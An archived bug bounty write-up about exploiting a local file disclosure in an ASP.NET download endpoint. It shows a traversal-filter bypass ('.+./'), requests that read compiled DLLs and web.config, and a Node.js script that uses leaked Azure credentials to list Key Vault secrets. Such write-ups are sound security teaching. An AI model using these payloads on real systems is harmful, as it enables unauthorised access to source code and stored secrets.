---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-12-16_reading-asp-secrets-for-17000.md
original_filename: 2018-12-16_reading-asp-secrets-for-17000.md
title: Reading ASP secrets for $17,000
category: documents
detected_topics:
- access-control
- command-injection
- path-traversal
- otp
- cloud-security
tags:
- imported
- documents
- access-control
- command-injection
- path-traversal
- otp
- cloud-security
language: en
raw_sha256: 9035512c6f0c9eb54411a589e87a92e72c69fd8a9f7dec5e5651a0cdedb6159b
text_sha256: 27e62d306e435cf2c6f8306b9022fdf15a5fc83c933e67ccd16d3cd6ad23c601
ingested_at: '2026-06-28T07:31:58Z'
sensitivity: unknown
redactions_applied: true
---

# Reading ASP secrets for $17,000

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-12-16_reading-asp-secrets-for-17000.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, path-traversal, otp, cloud-security
- Ingested At: 2026-06-28T07:31:58Z
- Redactions Applied: True
- Raw SHA256: `9035512c6f0c9eb54411a589e87a92e72c69fd8a9f7dec5e5651a0cdedb6159b`
- Text SHA256: `27e62d306e435cf2c6f8306b9022fdf15a5fc83c933e67ccd16d3cd6ad23c601`


## Content

---
title: "Reading ASP secrets for $17,000"
url: "https://samcurry.net/reading-asp-secrets-for-17000/"
final_url: "https://samcurry.net/reading-asp-secrets-for-17000"
authors: ["Sam Curry (@samwcyo)"]
bugs: ["Local file disclosure (LFD)"]
bounty: "17,000"
publication_date: "2018-12-16"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5518
---

[Back to blog](/)

# Reading ASP secrets for $17,000

December 17, 2018

![Reading ASP secrets for $17,000](/_next/image?url=%2Fimages%2Freading-asp-secrets-for-17000%2F1_5WzlrdAGGGSKqJBesbl8cA-1024x560-1.png&w=3840&q=75)

One of the more common vulnerabilities on ASP.NET applications is local file disclosure. If you've never developed or worked with this technology, exploiting LFD can be confusing and often unfruitful. In the following write up I describe approaching an application that ended up being vulnerable to LFD, then going on to exploit it.

**Identifying the Vulnerability**

While working on a recent target, I ran into this endpoint...
  
  
  https://domain.com/utility/download.aspx?f=DJ/lc1jVgHTZF...
  

When loading the page, it would download a help document from another path on the server. I didn't think that I'd be able to tamper with the functionality since it's an encrypted parameter, but I kept it in mind going forward. If I was able to ever compromise the key to sign the parameter (probably AES) then I could forge parameters and exploit the LFD.

To my surprise, I eventually saw the same endpoint being used on an older portion of the website with the following...
  
  
  https://domain.com/utility/download.aspx?f=file1234.docx
  

... and receiving ...
  
  
  HTTP/1.1 200 OK
  Connection: close
  Content-Length: 27363
  
  Ïó|uœZ^tÙ¢yÇ¯;!Y,}{ûCƒ³/h>
  ...
  

The first thing I saw after doing this was provide `download.aspx` as the argument, and to my surprise I was met with the source of the `download.aspx` file.
  
  
  GET /utility/download.aspx?f=download.aspx
  
  
  
  HTTP/1.1 200 OK
  Connection: close
  Content-Length: 263
  
  <%@ Page Language="C#" AutoEventWireup="true" Debug="true" %>
  ...
  

Reading `download.aspx` is great for demonstrating that I could access arbitrary files, but it didn't really demonstrate impact as the "code behind file" (where the actual source of the file is stored) is located at `filename.aspx.cs`. I tried this and it did not work.

As it turns out, `.aspx.cs` files were inaccessible in the scenario I was trying to access them. (for more information about the difference between `.aspx` and `.aspx.cs`, [see here](https://stackoverflow.com/questions/13182757/what-is-the-difference-between-aspx-and-aspx-cs)).

This is something we'd definitely have to find a way around, but for now, let's try to read from a different directory so we can have more access with the vulnerability.

**Bypassing Traversal Block**

Something else I discovered with the endpoint was that I was unable to have two trailing periods (`..`), otherwise the request would respond with a `400 bad request` and fail.

One approach I took was to fuzz to see if there were any characters that it would ignore or concatenate.

To set this up, I used the following request...
  
  
  GET /utility/download.aspx?f=.[fuzz]./utility/download.aspx
  

![](/_next/image?url=%2Fimages%2Freading-asp-secrets-for-17000%2Fpayload.png&w=3840&q=75)

If you wanted to, you could throw this into Intruder and run standard fuzzing against it, manually doing it takes a bit more time but isn't too hard to accomplish

I began iterating characters manually until seeing that `.+./utility/download.aspx` would return with the contents of `download.aspx`. This was great as we could now traverse directories. Why did this exist? I wasn't sure. I had attempted this on my own ASP.NET application to see if it was a universal behavior, but it didn't work. My guess is that it had something to do with Window's filenames having spaces in them, but I never investigated it that thoroughly.

**Proving Moderate Impact via Source Disclosure**

Since I could now read below the path I was supposed to, one of the first things I had tried doing was reading a `.ashx` file. Since these were handlers instead of presentation files ([see here](https://www.dotnetperls.com/ashx)) I made a guess that they would possibly be accessible.

This worked!
  
  
  HTTP/1.1 200 OK
  Connection: close
  Content-Length: 2398
  
  <%@ WebHandler Language="C#" Class="redacted.redacted" %>
  
  Imports System
  Imports System.Data
  Imports System.Data.SqlClient
  Imports System.IO
  Imports System.Web
  Imports System.Configuration
  ...
  

This at least demonstrated that I was able to pull something even just a little bit sensitive. The next step for me was reading a little bit more source code.

Something I had found out reading documentation for ASP.NET apps is that compiled classes are kept in `/bin/className.dll`. This meant that we should be able to pull the class name referenced in our `.ashx` file.

By sending the following request, I was able to pull the DLL for the source file ([for more information about stored DLLs click here](https://blogs.msdn.microsoft.com/tom/2008/07/21/asp-net-tips-loading-a-dll-out-of-the-bin-directory/))...
  
  
  GET /utility/download.aspx?f=.+./.+./bin/redacted.dll
  

After downloading this, an attacker could use [dnSpy](https://github.com/0xd4d/dnSpy) to import the DLL and recover the source of the application in addition to likely more classes that they could enumerate and steal source from.

![](/_next/image?url=%2Fimages%2Freading-asp-secrets-for-17000%2Fexample.png&w=3840&q=75)

An example listing of DLLs for an ASP.NET application

**Proving Critical Impact via web.config Azure Keys Disclosure**

One of the files used in ASP.NET applications is `web.config` (huge shout out to @[nahamsec](https://twitter.com/nahamsec) for suggesting this file to read).

This file is essentially a settings page with additional variables for things ranging from individual pages to your entire web server. Lots of sensitive information can exist here like credentials for SQL, encryption keys for things like that parameter we saw above, and internal endpoints used by the application.

Below is an example web.config file.
  
  
  <?xml version="1.0" encoding="utf-8"?>
  <!--
  For more information on how to configure your ASP.NET application, please visit
  http://go.microsoft.com/fwlink/?LinkId=301880
  -->
  <configuration>
  <appSettings>
  <add key="webpages:Version" value="3.0.0.0" />
  <add key="webpages:Enabled" value="false" />
  <add key="ClientValidationEnabled" value="true" />
  <add key="UnobtrusiveJavaScriptEnabled" value="true" />
  
  <add key="PodioClientId" value="" />
  <add key="PodioClientSecret" value="" />
  
  <add key="AppId" value="" />
  <add key="SpaceId" value="" />
  </appSettings>
  
  <connectionStrings>
  <remove name="umbracoDbDSN" />
  <add name="PodioAspnetSampleDb" connectionString="server=WSA07;database=PodioAspnetSampleDb;user id=sa;password=***REDACTED*** providerName="System.Data.SqlClient" />
  </connectionStrings>
  
  <system.web>
  <compilation debug="true" targetFramework="4.5" />
  <httpRuntime targetFramework="4.5" />
  </system.web>
  </configuration>
  

To read the `web.config` on the bug bounty target, what was done was simply send the following request...
  
  
  GET /utility/download.aspx?f=.+./.+./web.config
  

The response included lots of secrets - but one of the worst was the exposure of the following keys...
  
  
  ...
  <add key="keyVaultDataPlaneUri" value="redacted" />
  <add key="uniqueKeyVaultNameUri" value="redacted" />
  <add key="keyVaultClientId" value="redacted" />
  <add key="keyVaultClientSecretIdentifier" value="redacted" />
  <add key="keyVaultClientTenantName" value="redacted" />
  <add key="keyVaultAuthenticationContextUri" value="redacted" />
  <add key="keyVaultApiVersion" value="2016-10-01" />
  ...
  

If used correctly, these allow access to an Azure Key Vault instance. Azure Key Vault is used to keep secrets for the application, and will generally contain some juicy stuff.

One of the issues is finding the correct way to send the request to access the secrets. After talking to [shubs](https://twitter.com/infosec_au), he quickly threw together a Node.js script to access the Azure Key Vault instance using the disclosed keys...
  
  
  var KeyVault = require('azure-keyvault');
  var AuthenticationContext = require('adal-node').AuthenticationContext;
  
  var clientId = "clientId";
  var clientSecret = "clientSecret";
  var vaultUri = "vaultUri";
  
  // Authenticator - retrieves the access token
  var authenticator = function (challenge, callback) {
  
  // Create a new authentication context.
  var context = new AuthenticationContext(challenge.authorization);
  
  // Use the context to acquire an authentication token.
  return context.acquireTokenWithClientCredentials(challenge.resource, clientId, clientSecret, function (err, tokenResponse) {
  if (err) throw err;
  // Calculate the value to be set in the request's Authorization header and resume the call.
  var authorizationValue = tokenResponse.tokenType + ' ' + tokenResponse.accessToken;
  console.log(authorizationValue);
  return callback(null, authorizationValue);
  });
  
  };
  
  var credentials = new KeyVault.KeyVaultCredentials(authenticator);
  var client = new KeyVault.KeyVaultClient(credentials);
  
  client.getSecrets(vaultUri).then(function(value) {
  console.log(value);
  });
  

... the response ...
  
  
  { id:
  'https://redacted.vault.azure.net/secrets/ftp_credentials',
  attributes:
  { enabled: true,
  created: 2018-01-23T22:14:18.000Z,
  updated: 2018-01-23T22:14:18.000Z,
  recoveryLevel: 'Purgeable' },
  contentType: 'secret' } ]
  
  ... more secrets ...
  

This is game over as the secrets contained credentials that would allow an attacker full write and read access to the system.

**Recap**

ASP.NET can't access source files? Read from `/bin/className.dll`.  
Want to see some awesome secrets? Read from `web.config`.

If you want to get better at hacking ASP.NET applications spend some time developing them. There are a lot of commonalities of issues (forced browsing, authentication bypass, shell upload, LFD and LFI, etc.) that you'll start to take notice if you can get past the _terribly annoying_ view-state tokens sent in almost every request.

Happy holidays!  
\- @[samwcyo](https://twitter.com/samwcyo)

**Timeline**

Reported - September 25th, 2018  
Triaged - September 27th, 2018  
Rewarded $17,000- September 29th, 2018
